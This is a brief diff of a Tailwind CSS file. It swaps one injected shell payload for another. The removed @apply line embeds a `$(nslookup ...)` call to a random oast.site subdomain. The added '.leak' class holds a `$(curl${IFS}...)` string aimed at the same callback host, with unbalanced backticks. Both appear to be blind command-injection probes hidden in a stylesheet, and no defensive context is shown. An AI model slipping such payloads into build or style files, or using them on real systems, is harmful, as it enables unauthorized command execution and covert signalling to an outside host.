@@ -1,3 +1,6 @@
-@apply `$(nslookup m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site)` {
-  /*!*/
+@tailwind base;
+@layer utilities {
+  .leak {
+    content: "`$(curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site`";
+  }
 }
